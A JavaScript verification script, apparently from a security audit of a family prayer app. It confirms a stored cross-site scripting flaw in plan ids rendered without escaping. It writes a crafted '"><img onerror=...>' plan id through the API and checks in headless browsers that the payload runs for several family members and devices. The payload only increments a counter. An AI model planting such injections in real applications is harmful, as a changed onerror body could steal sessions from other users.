// Skeptic 2 for critic-plan-id-xss-1: a family `plans` row whose plan id carries markup runs in renderPlans
// (apps/prayer.html:1183-1184, <option value="' + p.id + '"> with no esc()).
// Independent re-run: fresh local instance, WebKit, real clock. Checks (1) Kiara (kid) runs it after her own poll,
// (2) Eli (admin) runs it on tapping Family, (3) persistence: after Eli's ordinary family tick the server row still holds
// the payload, and Kiara's reopen on the same device runs it again, (4) a brand-new device's first open (P2-SYNC-02).
// The payload only increments a counter; it records nothing about tokens except their type.
// Run: node "audits/tools/phase3/prayer/verify-critic-plan-id-xss-1-2.mjs" [webkit|chromium]
//   -> audits/evidence/p3/prayer/verify-critic-plan-id-xss-1-2.json (+ .png)
import fs from 'node:fs';
import { local, sleep } from '../../lib/local.mjs';
const OUT = 'audits/evidence/p3/prayer';
const engine = process.argv[2] || 'webkit';
const res = { engine };
const log = (k, v) => { res[k] = v; console.log(k, '->', JSON.stringify(v).slice(0, 600)); };
const MARK = 'vc2';
const payload = MARK + '"><img src="x:" onerror="window.__vc=(window.__vc||0)+1"><b x="';
const plan = { id: payload, name: 'Everything', mode: 'everything', focusCategory: '', includeDaily: true, rotationSize: 3, groupByCategory: false,
  dayMap: { Sun: [], Mon: [], Tue: [], Wed: [], Thu: [], Fri: [], Sat: [] }, show: { meter: true, streak: true, answered: true, anniversaries: true, review: true } };
const serverPlan = async () => {
  const r = await L.apiAs('mom', '/api/data/prayer?scope=family');
  const it = k => (r.body.items || []).find(i => i.key === k);
  const pl = it('plans'), ap = it('activePlan');
  return { plansHasPayload: !!(pl && Array.isArray(pl.value) && pl.value.some(p => p.id === payload)), activePlanIsPayload: !!(ap && ap.value === payload), planIds: pl && Array.isArray(pl.value) ? pl.value.map(p => String(p.id).slice(0, 12)) : pl && pl.value };
};
async function open(profile, device, as) {
  const d = await L.device({ device, profile, fixedTime: false, ...(as ? { as } : {}) });
  const f = await d.openApp('prayer', { wait: '#todayLine' });
  await f.waitForFunction(() => document.getElementById('todayLine').textContent.trim().length > 0, null, { timeout: 15000 }); await sleep(800);
  return { d, f };
}
const probe = f => f.evaluate(() => ({ runs: window.__vc || 0, imgInSelect: document.querySelectorAll('#f-plan img').length, sessionType: typeof localStorage.getItem('hub.session'), activeList: D.activeList }));
const L = await local({ variant: 'typical', clock: 'real', engine });
try {
  const kid = await open('kiara', 'ipad-portrait');
  const eli = await open('eli', 'iphone-pwa');
  await sleep(4000);                                     // let both first-open writes flush before the crafted row
  log('serverBefore', await serverPlan());
  const now = Date.now();
  const w = await L.apiAs('ezra', '/api/data/prayer/batch?scope=family', { method: 'POST', body: { items: [{ key: 'plans', value: [plan], updated_at: now }, { key: 'activePlan', value: payload, updated_at: now }] } });
  log('writeAsEzra', { status: w.status, body: JSON.stringify(w.body).slice(0, 160) });
  log('serverAfterWrite', await serverPlan());

  // (1) Kiara: no interaction, wait for her own poll + absorbRemote -> renderPlans
  let t0 = Date.now(), got = false;
  while (Date.now() - t0 < 50000 && !got) { await sleep(1000); got = await kid.f.evaluate(p => D.lists.shared.activePlan === p, payload); }
  await sleep(1200);
  log('kiaraAfterPoll', { pulled: got, afterMs: Date.now() - t0, ...(await probe(kid.f)) });
  await kid.d.shot(`${OUT}/verify-critic-plan-id-xss-1-2-kiara.png`);

  // (2) Eli: personal list first, then tap Family
  t0 = Date.now(); got = false;
  while (Date.now() - t0 < 50000 && !got) { await sleep(1000); got = await eli.f.evaluate(p => D.lists.shared.activePlan === p, payload); }
  const onPersonal = await probe(eli.f);
  await eli.f.click('#listSwitch [data-list="shared"]'); await sleep(1000);
  log('eli', { pulled: got, onPersonal, afterFamily: await probe(eli.f), pageErrors: eli.d.logs.filter(l => l.startsWith('pageerror')).map(l => l.slice(0, 140)) });

  // (3a) Eli ticks one family request on Today (an ordinary family save) -> is the payload still on the server?
  const pid = await eli.f.evaluate(() => { const b = document.querySelector('#todayList [data-pray]'); return b && b.dataset.pray; });
  if (pid) { await eli.f.click(`#todayList [data-pray="${pid}"]`); }
  await sleep(4000);
  log('afterEliFamilyTick', { ticked: pid, eliRuns: (await probe(eli.f)).runs, server: await serverPlan() });

  // (3b) Kiara reopens Prayer on the same device (localStorage kept)
  await kid.f.evaluate(() => 0);
  const kf2 = await kid.d.openApp('prayer', { wait: '#todayLine' }); await sleep(2500);
  log('kiaraReopen', await probe(kf2));

  // (4) A brand-new device for Mae opens Prayer for the first time (P2-SYNC-02 first-open write)
  const dev = await L.newDevice({ name: 'Mae new phone', profiles: ['christian'] });
  const mae = await open('christian', 'iphone-pwa', dev);
  await mae.f.click('#listSwitch [data-list="shared"]').catch(() => {}); await sleep(5000);
  log('maeFreshDevice', { ...(await probe(mae.f)), server: await serverPlan() });
  await mae.d.close(); await kid.d.close(); await eli.d.close();
} catch (e) { log('error', String(e.stack || e)); }
finally {
  fs.writeFileSync(`${OUT}/verify-critic-plan-id-xss-1-2${engine === 'chromium' ? '-chromium' : ''}.json`, JSON.stringify(res, null, 2));
  await L.close();
}
